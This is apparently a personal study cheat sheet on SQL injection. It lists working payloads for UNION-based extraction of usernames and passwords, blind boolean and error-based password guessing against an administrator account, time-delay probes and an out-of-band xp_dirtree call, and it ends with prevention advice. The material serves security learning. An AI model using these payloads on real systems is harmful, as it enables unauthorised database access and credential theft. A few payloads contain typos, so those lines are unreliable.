# SQL Injection

- SQL injection cheat sheet: <https://portswigger.net/web-security/sql-injection/cheat-sheet>

![SQLi1](../../../markdownImages/2023-06-16-19-19-57.png)

## What to look for/how to find vulnerabilities

- Attack Scan in Burp/ZAP
- query parameters in URL:

  `https://insecure-website.com/products?category=Gifts`

  Attack with:

  ```https
  https://insecure-website.com/products?category=Gifts'--
  https://insecure-website.com/products?category=Gifts'+OR+1=1--
  https://insecure-website.com/?user'+OR+1=1--
  ```

- login forms
- input fields

## Step-by-Step: Reflected Attack with UNION based SQL injection

- SQL injection UNION attacks --> this is useful to retrieve data from other tables, when query results are **reflected** on the page or to get the column data type of a query

  - Steps:

    1. involves injecting ORDER BY --> modifies original query to order results by different columns in result set; when specified column index exceeds number of actual columns, database an error...

       ```sql
       -- Payloads:
       ' ORDER BY 1--
       ' ORDER BY 2--
       ```

    2. submit series of UNION SELECT payloads specifying different number of null values --> if number of nulls does not match number of cols, DB returns error; when number of nulls matches number of columns, DB returns additional empty row in result set

       ```sql
       -- Payloads:
       ' UNION SELECT NULL--
       ' UNION SELECT NULL,NULL--
       ' UNION SELECT NULL,NULL,NULL-- etc.
       ```

    3. having already determined how many columns there are, we can probe column type use UNION SELECT with specific payload e.g. for strings:

       ```sql
       --Payloads:
       ' UNION select 'a',NULL,NULL--
       ' UNION select NULL,'a',NULL--
       ' UNION select NULL,NULL,'a'-- and so on
       ```

    4. when we determined number of columns and column datatype we can try to retrieve additional sensitive data:

    ```sql
    --Payloads:
    ' UNION sekect username, password from users--
    ```

    5. Retrieve multiple values in single column if query return only one column with string concatenation:

    ```sql
    --Payloads:
    ' UNION SELECT username || '~' || password FROM users-- (Oracle, Postgres)
    ' UNION SELECT username + '~' + password FROM users-- (SQLServer)
    ' UNION SELECT username '~' password FROM users-- (MySQL) or...
    ' UNION SELECT concat(username, concat('~',password)) FROM users-- (MySQL)
    ```

    6. Query Database information with UNION based attack

    ```sql
    --Payloads for Database Version Listing
    ' UNION SELECT @@version-- SQLServer, MySQL
    ' UNION SELECT * FROM v$version --Oracle
    ' SELECT version() --Postgres
    ```

    ```sql
    --Payloads for content listing
    -- most database (except for Oracle):
    ' UNION select table_name from information_schema.tables
    -- then...
    ' UNION select column_name from information_schema.tables where table_name='MYTAB'
    --Content listing Oracle
    ' UNION select table_name from all_tables
    --then...
    ' UNION select column_name from all_tab_columns where table_name='MYTAB'
    ```

## Step-by-Step: Blind SQLi vulnerabilities

- different exploit techniques:

  1. Triggering different responses conditionally depending injected condition:

  ```sql
  --Payloads to check for SQLi vulnerability without reflected query results
  ' AND '1'='1  --> returns true, so results should be returned as expected
  ' AND '1'='2  --> returns false, so no results should be returned
  --Example: table called users with columns username and password and user called 'administrator'
  --first determine password length
  ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a
  --we can systematically determine password for this user by sending series of inputs to test password one character at a time
  ' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'administrator'), 1, 1) > 'm -->returns true if first character of password is > t, else false
  ' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'administrator'), 1, 1) = 's --> and so on until we have the matching first character of passwd
  ' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'administrator'), 1, 1) > 'm -->returns true if first character of password is > m, else false
  ' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'administrator'), 2, 1) = 's --> do the same for the second character and so on
  ```

  2. Error based injection --> whenever the application doesn't behave differently if there is an error in SQL query or not --> so we need to induce the query so that it will cause a database error if the condition is TRUE, but NOT if the condition is false

  ```sql
  --Exploiting blind SQLi by triggering conditional errors
  --often possible to induce application to return conditional responses by triggering SQL errors conditionally
  --induced query will cause DB error if condition is true but not if false
  --Payloads:
  ' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a --> always false
  ' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
  --test on character at a time (see also blind SQLi in 1.)
  ' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
  ```

## Detect SQLi vulnerabilites

- Submit the single quote character `'` and look for errors or other anomalies
- Submit some SQL-specific syntax that evaluates to the base (original) value of the entry point (`ACII(97)`), and to a different value, and look for systematic differences in the resulting application responses.
- Submit Boolean conditions such as `' OR 1=1` and `' OR 1=2` and look for differences in the application's responses
- Submit payloads designed to trigger time delays when executed within a SQL query and look for differences in the time taken to respond: `'; waitfor delay ('0:0:20')--`
- Submit OAST payloads designed to trigger an out-of-band network interaction when executed within a SQL query and monitor for any resulting interactions: `'; exec mast..xp_dirtree '//....../..'`
- SQLi happens when user-provided data (for example in Browser input fields) gets included in the SQL query
- attacker can perform SQL injection attacks using any controllable input that is processed as a SQL query by the application
- Example: some websites take input in JSON or XML format and use this to query the database
- Most SQL injection vulnerabilities arise within the `WHERE` clause of a `SELECT` query but can in principle occur at any location within the query, and within different query types
- most common other locations where SQL injection arises are:
  - In `UPDATE` statements, within the updated values or the `WHERE` clause
  - In `INSERT` statements, within the inserted values
  - In `SELECT` statements, within the table or column name
  - In `SELECT` statements, within the `ORDER BY` clause

## Further information on SQLi

### In-Band

- method of communication being used to exploit the vulnerability and also receive the results, for example, discovering an SQL Injection vulnerability on a website page and then being able to extract data from the database to the same page
- Error-Based:
  - most useful for easily obtaining information about the database structure as error messages from the database are printed directly to the browser screen. This can often be used to enumerate a whole database
- Union-Based
  - utilises the SQL UNION operator alongside a SELECT statement to return additional results to the page. This method is the most common way of extracting large amounts of data via an SQL Injection vulnerability
  - Useful link: <https://portswigger.net/web-security/sql-injection/union-attacks>

### Blind

- <https://portswigger.net/web-security/sql-injection/blind>
- we get little to no feedback to confirm wether our injected queries were successful or not (because error messages have been disabled)
- Authentication Bypass:
  - for this we just need to create database query that replies with a yes/true, to bypass authentication
- Boolean Based:
  - refers to the response we receive back from our injection attempts which could be a true/false, yes/no, on/off, 1/0 or any response which can only ever have two outcomes
  - outcome confirms to us that SQL Injection payload was either successful or not
  - On first inspection, it may feel like this limited response can't provide much information. Still with just these two responses, it's possible to enumerate a whole database structure and contents

### Time Based

- A time-based blind SQL Injection is very similar to Boolean based
- same requests are sent, but there is no visual indicator of queries being wrong or right
- Instead, indicator of correct query is based on the time the query takes to complete
- time delay is introduced by using built-in methods such as **SLEEP(x)** alongside the UNION statement.
- SLEEP() method will only ever get executed upon a successful UNION SELECT statement.

### Out Of Band

- isn't as common as it either depends on specific features being enabled on the database server or the web application's business logic, which makes some kind of external network call based on the results from an SQL query
- needs use of OAST (Out-Of-Band-Security-Testing) techniques: https://portswigger.net/burp/application-security-testing/oast
  - use external servers to see otherwise invisible vulnerabilities

## How to Prevent SQLi

- Prepared Statements
  - ensures that the SQL code structure doesn't change and the database can distinguish between the query and the data
- Input Validation
  - Employing an allow list can restrict input
  - string replacement method in the programming language can filter the characters you wish to allow or disallow
- Escaping User Input
  - Escaping user input is the method of prepending a backslash (\) to these characters, which then causes them to be parsed just as a regular string and not a special character

## Exploit

```

```
